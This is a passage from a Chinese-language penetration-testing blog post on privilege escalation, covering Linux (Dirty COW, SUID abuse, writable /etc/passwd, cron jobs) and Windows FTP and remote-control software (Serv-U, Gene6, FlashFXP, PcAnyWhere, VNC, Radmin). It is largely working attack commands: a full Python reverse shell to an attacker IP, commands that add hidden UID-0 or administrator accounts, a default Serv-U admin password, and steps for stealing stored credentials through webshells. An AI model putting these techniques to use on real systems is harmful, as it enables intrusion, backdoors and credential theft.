<p>exp：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p>
<p><strong>利用gcc编译dirty.c文件</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%8F%90%E6%9D%83/3.jpg"></p>
<p><strong>执行当前编译的dirty.c文件</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;dirty</span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%8F%90%E6%9D%83/4.jpg"></p>
<p><img src="/image/%E6%8F%90%E6%9D%83/5.jpg"></p>
<p><strong>然后su firefart切换到此用户会发现已经是root权限了</strong><br>恢复回去使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename &#x2F;tmp&#x2F;</span><br></pre></td></tr></table></figure>

<h4 id="三、SUID提权"><a href="#三、SUID提权" class="headerlink" title="三、SUID提权"></a>三、SUID提权</h4><p><strong>简单介绍一下概念</strong></p>
<blockquote>
<p>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。</p>
</blockquote>
<p><strong>什么是SUID提权？</strong></p>
<blockquote>
<p>那么什么是suid提权呢？我理解的就是有个文件，它有s标志，并且他输入root，那么我们运行这个程序就可以有了root的权限，并且这个程序还得能执行命令，不然没什么用处，那么我们就能从普通用户提升到了root权限了。</p>
</blockquote>
<p>首先在本地查找符合条件的文件，有以下三个命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span><br><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>已知的可用来提权的linux可行性的文件列表如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br></pre></td></tr></table></figure>

<h5 id="利用find文件提权"><a href="#利用find文件提权" class="headerlink" title="利用find文件提权"></a>利用find文件提权</h5><p>假如我们现在拿到了一个网站服务器的shell，但是权限是ubuntu，我们现在需要提权到 root 用户权限。</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/6.jpg"></p>
<p>我们查看具有root用户权限的SUID文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%8F%90%E6%9D%83/7.jpg"></p>
<p>我们随便找一个命令进行利用，我们就找find，先查看其信息，发现其确实是root用户权限的SUID的文件</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/8.jpg"></p>
<p>我们先看一下是否能用find命令以root权限运行，发现确实可以以root权限运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;find examples.desktop -exec whoami \;</span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%8F%90%E6%9D%83/9.jpg"></p>
<p>然后我们查看目标网站上是否有python环境，可以看到有python2.7.6的环境</p>
<p>于是我们以root用户的身份利用python反弹shell，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.10.25&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;  #反弹一个sh类型的shell</span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%8F%90%E6%9D%83/10.jpg"></p>
<p>可以看到，在攻击端收到了反弹过来的shell，并且是root身份</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/11.jpg"></p>
<p><strong>本节来自谢公子的博客：</strong><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://blog.csdn.net/qq_36119192/article/details/84872644">https://blog.csdn.net/qq_36119192/article/details/84872644</a></p>
<h4 id="四、Linux配置错误提权"><a href="#四、Linux配置错误提权" class="headerlink" title="四、Linux配置错误提权"></a>四、Linux配置错误提权</h4><p>还有就是利用Linux的配置文件错误，导致 /etc/passwd 文件可写入提权：</p>
<p>对Linux配置进行检查的脚本有：<br><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.securitysift.com/download/linuxprivchecker.py">https://www.securitysift.com/download/linuxprivchecker.py</a><br><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a></p>
<p>当我们获得了某个Linux服务器的低权限之后，我们想要对该低权限账号进行提权，以执行更多的操作。<br>接下来我们的提权是利用 /etc/passwd 文件的可写入权限，导致我们写入一个其他用户进去。<br>首先，查看 /etc/passwd 的权限，发现任何用户都可以读写。</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/12.jpg"></p>
<p>我们现在要做的就是自己构造一个用户，在密码占位符处指定密码，并且UID设置为0，将其添加到 /etc/passwd 文件中。</p>
<p>首先，使用perl语言生成带有盐值的密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -le &#39;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%8F%90%E6%9D%83/13.jpg"></p>
<p>然后执行下面这条命令，成功将test用户的信息加入 /etc/passwd 文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test:advwtv&#x2F;9yU5yQ:0:0:User_like_root:&#x2F;root:&#x2F;bin&#x2F;bash&quot; &gt;&gt;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%8F%90%E6%9D%83/14.jpg"></p>
<p>以用户名：test 密码： password@123 登录主机，登录成功后，是 root 权限。</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/15.jpg"></p>
<p>以下这条命令直接生成一个具有root权限的用户：venus，密码为：123qwe 。前提是这条命令的执行需要root权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;user&#39; 123qwe&#96; -u 0 -o -g root  -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;user venus</span><br></pre></td></tr></table></figure>

<p>本章来自于谢公子的博客：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://blog.csdn.net/qq_36119192/article/details/99871667">https://blog.csdn.net/qq_36119192/article/details/99871667</a></p>
<h4 id="五、定时任务提权"><a href="#五、定时任务提权" class="headerlink" title="五、定时任务提权"></a>五、定时任务提权</h4><p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出。默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写，我们就可以修改脚本进行提权了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;etc&#x2F;cron*</span><br></pre></td></tr></table></figure>

<p>使用该命令，列出的文件，查看 /etc/cron.daily 、/etc/cron.hourly、/etc/cron.monthly、/etc/cron.weekly 这四个文件夹内的文件，查看是否允许其他用户修改。如果 允许任意用户修改，那么我们就可以往这些文件里面写入反弹shell的脚本提权了。</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/16.jpg"></p>
<h4 id="六、密码复用提权"><a href="#六、密码复用提权" class="headerlink" title="六、密码复用提权"></a>六、密码复用提权</h4><p>我们如果在主机上找到了其他应用或数据库的密码，那么很有可能root用户也用该密码。那么就可以尝试一下 su root 来提权了。</p>
<h4 id="七、ReDuh内网端口转发"><a href="#七、ReDuh内网端口转发" class="headerlink" title="七、ReDuh内网端口转发"></a>七、ReDuh内网端口转发</h4><p>ReDuh是可以把内网服务器的端口通过http或https隧道转发到本机，形成一个TCP连通回路，用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部端口的工具。</p>
<p>详细介绍:<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://www.cnblogs.com/huhu0013/p/4567319.html">http://www.cnblogs.com/huhu0013/p/4567319.html</a></p>
<h4 id="八、内网渗透神器ReGeorg"><a href="#八、内网渗透神器ReGeorg" class="headerlink" title="八、内网渗透神器ReGeorg"></a>八、内网渗透神器ReGeorg</h4><p>ReGeorg是ReDuh的继承者。主要是把内网服务器的端口通过http/https隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。</p>
<p>详细介绍:<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://iscc.gxu.edu.cn/index.php/News/show/id/34">http://iscc.gxu.edu.cn/index.php/News/show/id/34</a></p>
<h1 id="第三方软件-提权"><a href="#第三方软件-提权" class="headerlink" title="第三方软件 提权"></a>第三方软件 提权</h1><p><strong>Serv-U FTP Server，是一种被广泛运用的FTP服务器端软件，支持3x/9x/ME/NT/2K等全Windows系列。可以设定多个FTP服务器、限定登录用户的权限、登录主目录及空间大小等</strong></p>
<h2 id="Serv-U提权分两种"><a href="#Serv-U提权分两种" class="headerlink" title="Serv-U提权分两种"></a>Serv-U提权分两种</h2><p><strong>1.有修改权限</strong></p>
<p><strong>2.无权限修改</strong></p>
<h3 id="有修改权限"><a href="#有修改权限" class="headerlink" title="有修改权限"></a>有修改权限</h3><p><strong>0.判断是否安装serv-u</strong></p>
<p>serv-u的默认端口是43958  可以用nmap 扫描确认</p>
<p><strong>1.检查是否有可写权限</strong></p>
<h4 id="1、通过修改配置文件提权"><a href="#1、通过修改配置文件提权" class="headerlink" title="1、通过修改配置文件提权"></a>1、通过修改配置文件提权</h4><blockquote>
<p>首先找配置文件<br>一般安装目录 c:\Program Files\Serv-u\SerUDaemon.ini</p>
</blockquote>
<p><img src="/image/%E6%8F%90%E6%9D%83/17.jpg"></p>
<blockquote>
<p>修改配置文件，最后提交，成功添加一个新用户，有权限的系统管理员<br>复制一个 修改名字<br>password 密码格式 是  gw+md5     我从<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.cmd5.com/">https://www.cmd5.com/</a>   把gw123456  加密  注意gw是他的 属于密码规则<br>把加密完的密码去替换复制的密码  password=gw+md5(gw123456)<br>maintenance=system   是代表系统权限  user=你命名的用户</p>
</blockquote>
<p><img src="/image/%E6%8F%90%E6%9D%83/18.jpg"></p>
<p><img src="/image/%E6%8F%90%E6%9D%83/19.jpg"></p>
<blockquote>
<p>找到安装目录，将文件添加一个有修改权限</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/20.jpg"></p>
</blockquote>
<blockquote>
<p>成功添加系统管理员</p>
</blockquote>
<p><img src="/image/%E6%8F%90%E6%9D%83/21.jpg"></p>
<p>密码用cmd5解密，=后面两位不用管，直接解密后面就ok</p>
<p>成功添加用户后，我们可以通过工具FlashFXP进行连接</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/22.jpg"></p>
<p>也可以用cmd.exe连接</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/23.jpg"></p>
<p>cmd访问 ftp 连接  ip  输入你刚刚添加的用户密码</p>
<p>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">quote site exec net user username password &#x2F;add</span><br><span class="line"></span><br><span class="line">quote site exec net localgroup administrators username &#x2F;add  </span><br></pre></td></tr></table></figure>

<p><strong>利用ftp命令quote site exec 添加用户 加入administrators 权限组</strong></p>
<p>打开3389连接</p>
<h3 id="无修改权限"><a href="#无修改权限" class="headerlink" title="无修改权限"></a><strong>无修改权限</strong></h3><p>1.利用md5 直接去解密（ini 文件密码在ftp连）</p>
<p>2.默认密码，默认用户</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/24.jpg"></p>
<p>账户：LocalAdministrator ，密码：#l@$ak#.lk;0@P</p>
<p>命令cmd /c net user DisKill /add &amp; net localgroup administrators DisKill /add</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/25.jpg"></p>
<p>添加了一个隐藏用户查看方法net user tls$</p>
<p>3.不是默认密码时 直接把SerUAdmin.exe 下载下来 进行查看密码</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/26.jpg"></p>
<p><img src="/image/%E6%8F%90%E6%9D%83/27.jpg"></p>
<p>记住这里选an字符串</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/28.jpg"></p>
<p>. 后面就是密码  把它替换到</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/29.jpg"></p>
<p>这也叫溢出提权</p>
<h2 id="FlashFXP-替换文件漏洞提权"><a href="#FlashFXP-替换文件漏洞提权" class="headerlink" title="FlashFXP 替换文件漏洞提权"></a>FlashFXP 替换文件漏洞提权</h2><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><blockquote>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><strong>FlashFXP</strong>是一个功能强大的 FXP/<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.cr173.com/k/FlashFxp/">FTP</a> 软件，融合了一些其他优秀 FTP软件的优点，如像 CuteFTP 一样可以比较文件夹，支持彩色文字显示；像 BpFTP 支持多文件夹选择文件，能够缓存文件夹；像 LeapFTP 一样的外观界面，甚至设计思路也差相仿佛。支持上传、下载及第三方文件续传；可以跳过指定的文件类型，只传送 需要的文件；可以自定义不同文件类型的显示颜色；可以缓存远端文件夹列表，支持FTP代理及 Socks 3&amp;4；具有避免空闲功能，防止被站点踢出</p>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p><strong>FlashFXP可用于：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">• 发布和维护你的网站。</span><br><span class="line">• 上传和下载文件，照片，视频，音乐和更多！</span><br><span class="line">• 本地和远程文件传输或备份。</span><br><span class="line">• 共享您的文件与您的朋友和同事使用功能强大的站点管理器。</span><br><span class="line">• 我们强大的传输调度安排和自动化文件传输。</span><br></pre></td></tr></table></figure>

<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1） 基于官方便携安装版破解打包，去后续检测更新提示</span><br><span class="line"></span><br><span class="line">2） 集成密钥文件，启动即为已授权版</span><br><span class="line"></span><br><span class="line">3） 禁止联网验证注册信息，后续不反弹</span><br><span class="line"></span><br><span class="line">4） 补充汉化翻译了官方简体中文语言，默认启动为中文，删多语言、帮助文档 4.x</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>**FlashFXP 中的“FXP” 是什么意思? **</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FXP是指在两台服务之间的直线传输。也可以称为“站到站传输”(Site to Site Transfers)。</span><br><span class="line"></span><br><span class="line">**注：**FXP过程需要服务两台服务器均支持方可进行。它利用服务器之间的高速连接，实现文件的高效传输，几乎不会占用本机的带宽资源。</span><br></pre></td></tr></table></figure>

<p><strong>FlashFXP 的不足?</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FlashFXP 无法像CuteFTP那样实现的多窗功能，CuteFTP 可在一个窗口中打开多个站点。此外，FlashFXP 尚不支持多进程传输，所有的下载和上传任务均是以单线程进行。</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="0x02-环境配置"><a href="#0x02-环境配置" class="headerlink" title="0x02 环境配置"></a>0x02 环境配置</h3><blockquote>
<p><strong>操作系统</strong>：windows 2003 企业版</p>
<p><strong>FTP服务：</strong>使用serv-u服务器，常规提权方法均失效</p>
<p><strong>权限情况：</strong>其他常规方法都无法提权</p>
<p><strong>使用工具：</strong>ASP、. NET版本Shell一个</p>
</blockquote>
<h3 id="0x03-FlashFXP-提权思维导图"><a href="#0x03-FlashFXP-提权思维导图" class="headerlink" title="0x03 FlashFXP 提权思维导图"></a>0x03 FlashFXP 提权思维导图</h3><p><strong>提权思路：</strong>利用FlashFXP替换文件漏洞，可以读取管理员链接过的站点账号密码。</p>
<p><strong>思路扩展：</strong>通过社会工程学猜测其他的密码同样如此,借此机会扩大权限</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/30.jpg"></p>
<h3 id="0x04-操作演示"><a href="#0x04-操作演示" class="headerlink" title="0x04 操作演示"></a>0x04 操作演示</h3><p>**1. **首先获取WebShell，我们可以利用大马或菜刀，将quick.dat下载下来（因为链接的账号密码都保存在quick.dat这个文件中）</p>
<p><strong>注：</strong>falshfxp默认安装目录：C:\Program Files\flashfxp</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/31.jpg"></p>
<p>**2. **接下来打开我们拿到的webshell,下载quick.dat这个文件，下载后，打开我们本机的FlashFTP把原先的文件提换掉，打开本机软件，查看历史记录，可以看到受害者主机quick.dat 文件里的服务器、用户名、密码等信息，如果想要获取密码，可下载星号密码查看工具查看暗文。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">**星号密码查看工具地址：**[https:&#x2F;&#x2F;www.arpun.com&#x2F;soft&#x2F;8153.html](https:&#x2F;&#x2F;www.arpun.com&#x2F;soft&#x2F;8153.html)</span><br><span class="line"></span><br><span class="line">参考链接：</span><br><span class="line"></span><br><span class="line">               [http:&#x2F;&#x2F;m.mamicode.com&#x2F;info-detail-1385885.html](http:&#x2F;&#x2F;m.mamicode.com&#x2F;info-detail-1385885.html)</span><br><span class="line"></span><br><span class="line">               [https:&#x2F;&#x2F;www.docin.com&#x2F;p-434258776.html](https:&#x2F;&#x2F;www.docin.com&#x2F;p-434258776.html)</span><br></pre></td></tr></table></figure>

<h2 id="Gene6-FTP提权"><a href="#Gene6-FTP提权" class="headerlink" title="Gene6 FTP提权"></a>Gene6 FTP提权</h2><blockquote>
<p>Gene6 FTP Server这个FTP软件简略易用,比SU的保险性高的多.<br>他的默认管理端口是<strong>8021</strong>,只容许本机盘算机连接.外部计算机即便你得到管理帐,你也不能登陆进去.<br>这一点和我们的SU一样,SU的管理端口是<strong>43958</strong>.<br>Gene6 FTP Server的帐户配置文件在:C:\Program Files\Gene6 FTP Server\RemoteAdmin\Remote.ini;在配置文件中找到md5加密的密码</p>
</blockquote>
<blockquote>
<p>那么我们只能通过webshell上传lcx.exe 把端口转发，如：lcx.exe –tran 600 127.0.0.1 8021  接通过另外一台机器安装一个gene6远程连接600端口创建一个域再创建一个有权限的帐号,注意Gene6可单独定义SITE命令调用执行文件文件可以通过webshell上传<br>上传为这样还不能提权.这里到了我们最核心的一步.<br>1.写一个能执行命令的批处理文件,并上传到目标主机.<br>@echo off<br>net user hack hack /add<br>net localgroup administrators hack /add<br>2.然后在SITE COMMANDS那个地方再进行配置.<br>COMMAND那输入你的命令执行的名字.我写的是HACK DESCRIPTTION这个是写描述的.这里随便你写什么都可以的.<br>EXECUTE这里输入你的BAT的命令执行文件的路径.也就是你刚上传的那个文件的路径.点OK就可以了.现在我们来看下我们本地的帐号情况.<br>只有两个帐号.<br>现在我们登陆FTP进行提权操作.输入提权命令 .</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quote site hack</span><br></pre></td></tr></table></figure>

<p>200 Command executed 命令成功执我们来看下加上帐号没有.<br>已经多了一个HACK的帐号,权限为管理权限.提升权限已经成功.，通过quote site exec 执行就行</p>
<h2 id="PCanyWhere提权"><a href="#PCanyWhere提权" class="headerlink" title="PCanyWhere提权"></a>PCanyWhere提权</h2><h3 id="PCAnyWhere简介"><a href="#PCAnyWhere简介" class="headerlink" title="PCAnyWhere简介"></a>PCAnyWhere简介</h3><p>PcAnyWhere是一款远程控制软件，它出现的目的是为了方便网管人员管理服务器。安装之后默认监听5631端口。它可以将电脑当成主控端去控制远方的另外一台同样安装有PcAnyWhere的电脑（被控端），实现互传文件，内建FIPS 140-2验证AES 256位元加密，可以确保阶段作业的安全性。</p>
<h3 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h3><p>PcAnyWhere提权的原理是PcAnyWhere在建立被控端后，会在服务器上产生一个配置文件“pca.***.cif”，这个文件所在的目录并非在安装目录中，而是在“C:\Document and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts”中。</p>
<p>在配置文件中保存着加密后的链接账户信息，当攻击者下载到这个文件之后，就可以对这个文件进行解密，之后即可获得用户名与密码，之后再使用本地的PcAnyWhere进行登录链接即可获得远程控制。</p>
<h3 id="提权操作演示"><a href="#提权操作演示" class="headerlink" title="提权操作演示"></a>提权操作演示</h3><h4 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h4><p>首先下载PcAnyWhere到本地，之后分别在靶机（Windows Server 2003 R2）、攻击主机Windows XP 中进行安装，之后再Windows Server 2003 R2中建立被控制端程序，设置用户名：hps  密码：*<strong><strong>****</strong></strong>,之后我们可以发现在“C:\Document and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts”中</p>
<p>存在一个用于记录该用户的文件：</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/32.jpg"></p>
<p>我们最终的目的就是通过在Windows Server 2003 R2上的WEBshell来下载该文件到攻击主机上，之后再进行破解，最后再使用攻击主机上的PcAnyWhere进行连接！下面进行具体操作！</p>
<p><strong>在Windows XP中使用菜刀连接一句话木马</strong></p>
<p><img src="/image/%E6%8F%90%E6%9D%83/33.jpg"></p>
<p>之后进入C:\Document and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts\下，下载文件</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/34.jpg"></p>
<p>之后可以使用明小子、通天门来对该文件进行解密，获得最后的用户名与密码，之后在本地创建PcAnyWhere的控制端进行连接即可！</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/35.jpg"></p>
<p><img src="/image/%E6%8F%90%E6%9D%83/36.jpg"></p>
<p>实现远控，提权！</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/37.jpg"></p>
<h2 id="VNC提权"><a href="#VNC提权" class="headerlink" title="VNC提权"></a>VNC提权</h2><p>VNC(Virtual Network Computing，虚拟网络计算）是一套由英国剑桥大学AT&amp;T实验<br>室在2002年开发的轻量型跨平台远程<br>控制计算机软件<br>“vnc的默认端口是5901使用端口扫描如果有便安装了vnc</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/38.jpg"></p>
<p>我们在实验时安装服务端就可</p>
<p>我们可以通过脚本大马读注册表获取密码如果不行利用菜刀上传一个cmd.exe到有读写权限的目录然后setp c:\路径…\cmd.exe #切换至上传的cmd来执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cmd&#x2F;c&quot;regedit&#x2F;ec:\123.reg&quot;HKEY_LOCAL_MACHINE\software\RealVNC\WinVNC4&quot; &quot;</span><br></pre></td></tr></table></figure>

<p>获取的密码<br>将得出的十进制数去掉第一个数其他转换成16进制<br>破解16进制数得到密码<br>vncx.exe -W 回车<br>输入16进制数<br>连接vnc<br>读取</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/39.jpg"></p>
<p>vncx4.exe -w 8个数 自动破解密码</p>
<p>然后使用我们vnc工具连接</p>
<h2 id="Radmin提权"><a href="#Radmin提权" class="headerlink" title="Radmin提权"></a>Radmin提权</h2><p>一款远控工具</p>
<p>端口扫描 4899 端口</p>
<p>上传 radmin.asp 木马读取 radmin的加密密文</p>
<p>下载radmin工具连接<br>或者<br>Radmin安装方法直接把server.exe 和admdll.dll放在vm里面，cmd下运行server.exe /setup  设置密码及输入注册信息就ok了；安装完之后可以通过C:&gt;cmd /c “regedit /e c:\123.reg “HKEY_LOCAL_MACHINE\system\RAdmin\v2.0\Server<br>Parameters””导出hash值，再通过hash版Radmin连接就可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x2F;c&quot;regedit&#x2F;ed:\IFEO.reg&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;&quot; </span><br><span class="line">cmd&#x2F;c&quot;regedit&#x2F;ed:\123.reg&quot;HKEY_LOCAL_MACHINE\system\RAdmin\v2.0\Server\Parameters&quot;&quot;</span><br></pre></td></tr></table></figure>
        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>future.zhangyan</span>
                    </p>
                
				
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://zhangyanlady.github.io/2019/09/19/%E6%8F%90%E6%9D%83/">https://zhangyanlady.github.io/2019/09/19/%E6%8F%90%E6%9D%83/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>The future can be expected, the world is worth it.</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"># 网络安全</a>
                    
                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2019/09/30/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
            
            
            <a class="next" rel="next" href="/2019/09/12/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">XSS跨站脚本攻击</a>
            
        </section>
			</br>
			

</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© future.zhangyan | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
	<span id="busuanzi_container_site_pv">
    本站总访问量<span id="busuanzi_value_site_pv"></span>次
</span>
</footer>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

    </div>


	
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
